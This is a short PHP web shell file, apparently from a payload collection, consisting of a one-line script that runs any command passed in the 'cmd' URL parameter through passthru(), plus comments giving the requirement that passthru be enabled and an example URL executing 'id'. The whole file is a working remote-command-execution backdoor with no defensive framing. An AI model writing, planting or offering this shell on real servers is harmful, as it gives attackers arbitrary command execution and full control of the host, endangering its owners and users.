# This will only work if the passthru() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_passthru.php?cmd=id

<?php passthru($_GET['cmd']); ?>